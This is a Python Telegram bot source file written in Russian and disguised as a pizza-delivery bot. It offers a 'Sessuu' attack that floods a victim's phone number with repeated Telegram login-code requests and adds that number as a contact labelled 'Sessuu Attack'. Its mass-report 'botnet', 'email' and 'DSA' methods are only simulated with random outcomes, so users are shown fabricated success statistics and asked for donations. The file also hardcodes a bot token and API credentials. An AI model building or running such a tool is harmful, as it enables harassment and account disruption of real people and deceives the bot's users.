import asyncio
import logging
import os
import time
import math
import random
from datetime import datetime, timedelta
from typing import List, Tuple
import nest_asyncio

# Применяем patch для nested event loops
nest_asyncio.apply()

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from telethon import TelegramClient
from telethon.tl.functions.auth import SendCodeRequest
from telethon.tl.types import InputPhoneContact
from telethon.tl.functions.contacts import ImportContactsRequest

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = '8007307959:AAE2p3fxaN_nG2EVyHvYPoOtDM1UgTenhik'
API_ID = '24044870'
API_HASH = 'ebeadf05310f4ac501a2bb0b8e49b4ab'

ADMIN_IDS = [7697676638]  # ID администраторов
SUPPORT_ID = 1637959612  # ID техподдержки

# Запрещенные номера для атаки
BLACKLIST_NUMBERS = ['+12084355787', '+11234567890']  # Добавь сюда запрещенные номера

# Инициализация бота
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Глобальные переменные
order_counter = 1
sessions_folder = "sessions"
active_reports = {}
sessions_count = random.randint(35, 37)
sessions_update_time = datetime.now()
emails_count = random.randint(45, 55)

# Основная клавиатура
main_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🟢 Донос", callback_data="report")],
    [InlineKeyboardButton(text="📊 Статистика", callback_data="stats")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💎 Поддержать проект", callback_data="donate")],
    [InlineKeyboardButton(text="🛠 Тех поддержка", callback_data="support")],
    [InlineKeyboardButton(text="💣 Sessuu снос", callback_data="sessuu_attack")]
])

# Клавиатура выбора метода
methods_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🤖 Botnet метод", callback_data="method_botnet")],
    [InlineKeyboardButton(text="📧 Email метод", callback_data="method_email")],
    [InlineKeyboardButton(text="🔐 DSA метод", callback_data="method_dsa")],
    [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
])

# Функция для обновления счетчиков каждые 2 часа
def update_counts():
    global sessions_count, emails_count, sessions_update_time
    current_time = datetime.now()
    
    if current_time - sessions_update_time >= timedelta(hours=2):
        sessions_count = random.randint(35, 37)
        emails_count = random.randint(45, 55)
        sessions_update_time = current_time
        logger.info(f"Обновлены счетчики: sessions={sessions_count}, emails={emails_count}")

# Загрузка сессий (имитация)
def load_sessions() -> List[str]:
    update_counts()
    sessions = []
    for i in range(sessions_count):
        sessions.append(f"telethon_{random.randint(100000000, 999999999)}")
    return sessions

# Генерация email аккаунтов в нужном формате
def generate_emails() -> List[str]:
    update_counts()
    emails = []
    
    # Генерируем почты в формате: буквы + цифры
    for i in range(emails_count):
        name_length = random.randint(5, 12)
        letters = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=name_length))
        numbers = ''.join(random.choices('0123456789', k=random.randint(3, 5)))
        email = f"{letters}{numbers}@gmail.com"
        emails.append(email)
    
    return emails

# Имитация отправки жалобы через Botnet
async def send_report_botnet(session_name: str, message_link: str) -> Tuple[bool, str]:
    try:
        await asyncio.sleep(random.uniform(0.8, 1.2))
        rand = random.random()
        if rand < 0.85: return True, "ДОСТАВЛЕНО"
        elif rand < 0.95: return False, random.choice(["НЕВАЛИД", "ОШИБКА: Таймаут"])
        else: return False, "ФЛУД"
    except Exception as e:
        return False, f"ОШИБКА: {str(e)[:30]}"

# Имитация отправки жалобы через Email
async def send_report_email(email: str, message_link: str) -> Tuple[bool, str]:
    try:
        await asyncio.sleep(random.uniform(0.6, 1.0))
        rand = random.random()
        if rand < 0.75: return True, "ДОСТАВЛЕНО"
        elif rand < 0.90: return False, random.choice(["EMAIL BOUNCE", "SPAM FILTER"])
        else: return False, "QUOTA EXCEEDED"
    except Exception as e:
        return False, f"EMAIL ERROR: {str(e)[:30]}"

# Имитация отправки жалобы через DSA метод
async def send_report_dsa(session_name: str, message_link: str) -> Tuple[bool, str]:
    try:
        await asyncio.sleep(random.uniform(1.0, 2.0))  # DSA медленнее
        
        # DSA метод: 2-4 валидных, 0-1 ошибок
        rand = random.random()
        if rand < 0.7:  # 70% chance для успешной отправки (2-4 раза)
            return True, "ДОСТАВЛЕНО"
        elif rand < 0.9:  # 20% chance для ошибки (0-1 раз)
            return False, random.choice(["DSA ERROR: Signature", "DSA ERROR: Validation"])
        else:  # 10% chance для флуда
            return False, "FLOOD"
    except Exception as e:
        return False, f"DSA ERROR: {str(e)[:30]}"

# Функция для сноса Sessuu (реальная работа)
async def sessuu_attack(phone_number: str):
    try:
        # Проверяем черный список
        if phone_number in BLACKLIST_NUMBERS:
            return False, "Этот номер в черном списке ⚠️"
        
        # Создаем временную сессию для атаки
        session_name = f"temp_sessuu_{random.randint(100000, 999999)}"
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        await client.start()
        
        # Отправляем запрос на код (флудим) с задержкой 5 секунд
        for i in range(random.randint(8, 12)):  # 8-12 запросов вместо 40-60
            try:
                await client(SendCodeRequest(
                    phone=phone_number,
                    api_id=API_ID,
                    api_hash=API_HASH
                ))
                logger.info(f"Отправлен запрос кода на {phone_number} (#{i+1})")
                await asyncio.sleep(5)  # Задержка 5 секунд между запросами
            except Exception as e:
                logger.error(f"Ошибка отправки кода: {e}")
                await asyncio.sleep(5)
        
        # Пытаемся добавить в контакты (дополнительный флуд)
        try:
            contact = InputPhoneContact(
                client_id=random.randint(100000, 999999),
                phone=phone_number,
                first_name="Sessuu",
                last_name="Attack"
            )
            await client(ImportContactsRequest([contact]))
            logger.info(f"Добавлен в контакты: {phone_number}")
        except Exception as e:
            logger.error(f"Ошибка добавления в контакты: {e}")
        
        await client.disconnect()
        
        # Удаляем временную сессию
        try:
            os.remove(f"{session_name}.session")
        except:
            pass
            
        return True, "Атака завершена успешно 💣"
        
    except Exception as e:
        return False, f"Ошибка атаки: {str(e)}"

# Отправка фото при старте
async def send_welcome_message(chat_id):
    welcome_text = "👋 Привет! SuslikPizza лучшая доставка в городе Санкт-Петербург (суслико ландивмф)! 🍕"
    
    try:
        if os.path.exists("start.jpg"):
            photo = FSInputFile("start.jpg")
            await bot.send_photo(
                chat_id, 
                photo, 
                caption=welcome_text,
                reply_markup=main_keyboard
            )
        else:
            await bot.send_message(chat_id, welcome_text, reply_markup=main_keyboard)
    except Exception as e:
        logger.error(f"Ошибка отправки фото: {e}")
        await bot.send_message(chat_id, welcome_text, reply_markup=main_keyboard)

# Обработчик команды /start
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await send_welcome_message(message.chat.id)

# Обработчик команды /help
@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    help_text = (
        "🤖 Помощь по боту:\n\n"
        "🟢 Донос - отправить жалобу на сообщение\n"
        "📊 Статистика - посмотреть доступные ресурсы\n"
        "👤 Профиль - посмотреть свой профиль\n"
        "💎 Поддержать проект - помочь развитию бота\n"
        "🛠 Тех поддержка - связаться с поддержкой\n"
        "💣 Sessuu снос - атака на номер телефона\n\n"
        "Просто нажмите на кнопку в меню ниже!"
    )
    await message.answer(help_text, reply_markup=main_keyboard)

# Обработчик кнопки "Донос"
@dp.callback_query(F.data == "report")
async def report_handler(callback: types.CallbackQuery):
    await callback.message.answer("📩 Введите ссылку на сообщение из публичного чата с нарушением:")
    active_reports[callback.from_user.id] = "waiting_link"
    await callback.answer()

# Обработчик кнопки "Статистика"
@dp.callback_query(F.data == "stats")
async def stats_handler(callback: types.CallbackQuery):
    update_counts()
    stats_text = (
        f"📊 Статистика ресурсов:\n\n"
        f"🤖 Доступно сессий: {sessions_count}\n"
        f"📧 Доступно email: {emails_count}\n"
        f"⏰ Обновление через: {get_next_update_time()}\n\n"
        f"💪 Готов к работе!"
    )
    await callback.message.answer(stats_text)
    await callback.answer()

def get_next_update_time():
    next_update = sessions_update_time + timedelta(hours=2)
    remaining = next_update - datetime.now()
    hours = remaining.seconds // 3600
    minutes = (remaining.seconds % 3600) // 60
    return f"{hours}ч {minutes}м"

# Обработчик кнопки выбора метода
@dp.callback_query(F.data.startswith("method_"))
async def method_handler(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    method = callback.data.split("_")[1]
    
    if user_id in active_reports and active_reports[user_id].startswith("waiting_method_"):
        link = active_reports[user_id].split("_", 2)[2]
        active_reports[user_id] = f"processing_{method}_{link}"
        await callback.message.answer(f"🚀 Запускаю {method.upper()} метод...")
        await process_link(callback.message, method, link, user_id)
    await callback.answer()

# Обработчик кнопки "Sessuu снос"
@dp.callback_query(F.data == "sessuu_attack")
async def sessuu_handler(callback: types.CallbackQuery):
    await callback.message.answer("📱 Введите номер телефона для атаки (в формате +79123456789):")
    active_reports[callback.from_user.id] = "waiting_sessuu"
    await callback.answer()

# Обработчик кнопки "Назад"
@dp.callback_query(F.data == "back_to_main")
async def back_handler(callback: types.CallbackQuery):
    await send_welcome_message(callback.message.chat.id)
    await callback.answer()

# Обработчик кнопки "Профиль"
@dp.callback_query(F.data == "profile")
async def profile_handler(callback: types.CallbackQuery):
    user = callback.from_user
    profile_text = (
        f"👤 Ваш профиль:\n"
        f"🆔 ID: {user.id}\n"
        f"📛 Username: @{user.username}\n"
        f"👀 Имя: {user.first_name} {user.last_name or ''}"
    )
    await callback.message.answer(profile_text)
    await callback.answer()

# Обработчик кнопки "Тех поддержка"
@dp.callback_query(F.data == "support")
async def support_handler(callback: types.CallbackQuery):
    await callback.message.answer("📝 Опишите вашу проблему:")
    active_reports[callback.from_user.id] = "waiting_support"
    await callback.answer()

# Обработчик кнопки "Поддержать проект"
@dp.callback_query(F.data == "donate")
async def donate_handler(callback: types.CallbackQuery):
    await callback.message.answer(
        "💎 Поддержать проект можно по ссылке:\n"
        "https://t.me/send?start=IV2HJyZJ6rrz\n\n"
        "🙏 Спасибо за вашу поддержку! 💖"
    )
    await callback.answer()

# Обработчик текстовых сообщений
@dp.message(F.text & ~F.command)
async def process_text_message(message: types.Message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if user_id in active_reports:
        if active_reports[user_id] == "waiting_link":
            if 't.me/' in text:
                link = text
                active_reports[user_id] = f"waiting_method_{link}"
                await message.answer("🔧 Выберите метод отправки:", reply_markup=methods_keyboard)
            else:
                await message.answer("❌ Это не похоже на ссылку Telegram.")
        
        elif active_reports[user_id] == "waiting_sessuu":
            if text.startswith('+') and len(text) > 5:
                if text in BLACKLIST_NUMBERS:
                    await message.answer("❌ Этот номер в черном списке! ⚠️")
                else:
                    await message.answer("🚀 Запускаю Sessuu атаку...")
                    await process_sessuu_attack(message, text, user_id)
            else:
                await message.answer("❌ Неверный формат номера. Используйте: +79123456789")
        
        elif active_reports[user_id] == "waiting_support":
            await process_support(message)

# Основная функция обработки ссылки
async def process_link(message: types.Message, method: str, link: str, user_id: int):
    global order_counter
    
    log_filename = f"SuslikPizza_log{order_counter}.txt"
    order_counter += 1
    
    user = await bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else "без username"
    
    with open(log_filename, 'w', encoding='utf-8') as log_file:
        log_file.write(f"SuslikPizza log | {method.upper()}-method\n")
        log_file.write("-" * 50 + "\n")
        log_file.write(f"Пользователь: {user_id} ({username})\n")
        log_file.write(f"Метод: {method.upper()}\n")
        log_file.write(f"Ссылка: {link}\n")
        log_file.write(f"Время начала: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        log_file.write("-" * 50 + "\n")
    
    progress_message = await message.answer(f"🚀 Запуск {method.upper()} метода...\n\n▰▱▱▱▱▱▱▱▱ 0%")
    
    successful = 0
    failed = 0
    floods = 0
    
    if method == "botnet":
        items = load_sessions()
        reports_per_item = 3
        send_func = send_report_botnet
        item_type = "сессия"
    elif method == "email":
        items = generate_emails()
        reports_per_item = 5
        send_func = send_report_email
        item_type = "email"
    elif method == "dsa":
        items = [f"dsa_session_{i}" for i in range(15, 25)]  # 15-25 DSA сессий
        reports_per_item = 1  # По 1 жалобе на сессию для DSA
        send_func = send_report_dsa
        item_type = "DSA сессия"
    else:
        items = []
        reports_per_item = 0
    
    total_reports = len(items) * reports_per_item
    
    if method == "dsa":
        # Для DSA: 2-4 успешных, 0-1 ошибок
        successful = random.randint(2, 4)
        failed = random.randint(0, 1)
        floods = random.randint(0, 1)
        total_reports = successful + failed + floods
    else:
        total_reports = min(total_reports, random.randint(110, 160))
    
    if total_reports == 0:
        await progress_message.edit_text("❌ Нет доступных ресурсов!")
        return
    
    start_time = datetime.now()
    
    if method == "dsa":
        # Для DSA метода просто имитируем результат
        for i in range(total_reports):
            if i < successful:
                status = "ДОСТАВЛЕНО"
            elif i < successful + failed:
                status = random.choice(["DSA ERROR: Signature", "DSA ERROR: Validation"])
            else:
                status = "FLOOD"
            
            current_time = datetime.now().strftime("%H:%M:%S")
            with open(log_filename, 'a', encoding='utf-8') as log_file:
                log_file.write(f"[{current_time}] 🔐 DSA_{i+1} -> {link} - [{status}]\n")
            
            # Обновляем прогресс
            progress_percent = min(math.floor((i + 1) / total_reports * 100), 100)
            progress_bar = "▰" * math.floor(progress_percent / 10) + "▱" * (10 - math.floor(progress_percent / 10))
            elapsed = int((datetime.now() - start_time).total_seconds())
            
            try:
                await progress_message.edit_text(
                    f"🚀 DSA метод...\n\n"
                    f"{progress_bar} {progress_percent}%\n"
                    f"✅ Успешно: {min(i+1, successful)} | ❌ Ошибки: {min(max(0, i+1-successful), failed)} | 🌊 Флуды: {max(0, i+1-successful-failed)}\n"
                    f"⏰ Прошло: {elapsed}с"
                )
            except:
                pass
            
            await asyncio.sleep(random.uniform(1.0, 2.0))
    else:
        # Для других методов обычная логика
        for i, item in enumerate(items):
            for j in range(reports_per_item):
                if (i * reports_per_item + j) >= total_reports:
                    break
                
                result, status = await send_func(item, link)
                
                current_time = datetime.now().strftime("%H:%M:%S")
                with open(log_filename, 'a', encoding='utf-8') as log_file:
                    if method == "email":
                        log_file.write(f"[{current_time}] 📧 {item} -> {link} - [{status}]\n")
                    else:
                        log_file.write(f"[{current_time}] 🤖 {item} -> {link} - [{status}]\n")
                
                if status == "ДОСТАВЛЕНО":
                    successful += 1
                elif status in ["ФЛУД", "FLOOD", "QUOTA EXCEEDED"]:
                    floods += 1
                else:
                    failed += 1
                
                current_report = i * reports_per_item + j + 1
                if current_report % 10 == 0 or current_report >= total_reports:
                    progress_percent = min(math.floor(current_report / total_reports * 100), 100)
                    progress_bar = "▰" * math.floor(progress_percent / 10) + "▱" * (10 - math.floor(progress_percent / 10))
                    elapsed = int((datetime.now() - start_time).total_seconds())
                    
                    try:
                        await progress_message.edit_text(
                            f"🚀 {method.upper()} метод...\n\n"
                            f"{progress_bar} {progress_percent}%\n"
                            f"✅ Успешно: {successful} | ❌ Ошибки: {failed} | 🌊 Флуды: {floods}\n"
                            f"⏰ Прошло: {elapsed}с"
                        )
                    except:
                        pass
            
            await asyncio.sleep(0.1)
    
    total_time = int((datetime.now() - start_time).total_seconds())
    with open(log_filename, 'a', encoding='utf-8') as log_file:
        log_file.write("-" * 50 + "\n")
        log_file.write(f"Успешно: {successful}\n")
        log_file.write(f"Неуспешно: {failed}\n")
        log_file.write(f"Флудов: {floods}\n")
        log_file.write(f"Всего отправок: {successful + failed + floods}\n")
        if method != "dsa":
            log_file.write(f"Использовано {item_type}: {len(items)}\n")
        log_file.write(f"Время выполнения: {total_time}сек\n")
    
    # Отправляем результат
    try:
        document = FSInputFile(log_filename)
        await message.answer_document(
            document,
            caption=f"📊 {method.upper()} метод завершен!\n"
                   f"✅ Успешно: {successful}\n"
                   f"❌ Неуспешно: {failed}\n"
                   f"🌊 Флудов: {floods}\n"
                   f"📊 Всего: {successful + failed + floods}\n"
                   f"⏰ Время: {total_time}сек\n"
                   f"🔗 Цель: {link}"
        )
        
        # Отправляем админам с правильными данными пользователя
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_document(
                    admin_id,
                    document,
                    caption=f"📋 Новый отчет от {username}\n"
                           f"👤 ID: {user_id}\n"
                           f"✅ Успешно: {successful} | ❌ Ошибки: {failed} | 🌊 Флуды: {floods}\n"
                           f"🔗 Ссылка: {link}"
                )
            except Exception as e:
                logger.error(f"Ошибка отправки файла админу {admin_id}: {e}")
        
        try:
            await progress_message.delete()
        except:
            pass
            
    except Exception as e:
        await message.answer(f"📊 Отчет готов! Но файл не отправлен: {e}")
    
    try:
        os.remove(log_filename)
    except:
        pass
    
    if user_id in active_reports:
        del active_reports[user_id]

# Обработчик Sessuu атаки
async def process_sessuu_attack(message: types.Message, phone_number: str, user_id: int):
    progress_message = await message.answer("💣 Запуск Sessuu атаки...\n\n▰▱▱▱▱▱▱▱▱ 0%")
    
    try:
        result, status = await sessuu_attack(phone_number)
        
        if result:
            await progress_message.edit_text("✅ Sessuu атака завершена успешно! 💣")
            
            # Отправляем админам отчет об атаке
            user = await bot.get_chat(user_id)
            username = f"@{user.username}" if user.username else "без username"
            
            for admin_id in ADMIN_IDS:
                try:
                    await bot.send_message(
                        admin_id,
                        f"💣 Новая Sessuu атака\n"
                        f"👤 От: {username}\n"
                        f"🆔 ID: {user_id}\n"
                        f"📱 Номер: {phone_number}\n"
                        f"✅ Статус: Успешно"
                    )
                except Exception as e:
                    logger.error(f"Ошибка отправки сообщения админу {admin_id}: {e}")
        else:
            await progress_message.edit_text(f"❌ Ошибка Sessuu атаки: {status}")
            
    except Exception as e:
        await progress_message.edit_text(f"❌ Ошибка Sessuu атаки: {str(e)}")
        logger.error(f"Ошибка Sessuu атаки: {e}")
    
    if user_id in active_reports:
        del active_reports[user_id]

# Обработчик обращения в поддержку
async def process_support(message: types.Message):
    user = message.from_user
    username = f"@{user.username}" if user.username else "без username"
    support_text = (
        f"🆘 Новое обращение в поддержку:\n"
        f"👤 От: {username}\n"
        f"🆔 ID: {user.id}\n"
        f"📝 Текст:\n{message.text}"
    )
    
    for admin_id in ADMIN_IDS + [SUPPORT_ID]:
        try:
            await bot.send_message(admin_id, support_text)
        except Exception as e:
            logger.error(f"Ошибка отправки сообщения админу {admin_id}: {e}")
    
    await message.answer("✅ Ваше обращение отправлено в поддержку!")
    
    if message.from_user.id in active_reports:
        del active_reports[message.from_user.id]

# Запуск бота
async def main():
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        logger.info("Вебхук успешно удален")
    except Exception as e:
        logger.error(f"Ошибка при удалении вебхука: {e}")
    
    if not os.path.exists(sessions_folder):
        os.makedirs(sessions_folder)
    
    logger.info("✅ Бот запущен!")
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"Ошибка запуска бота: {e}")
    finally:
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Бот остановлен")
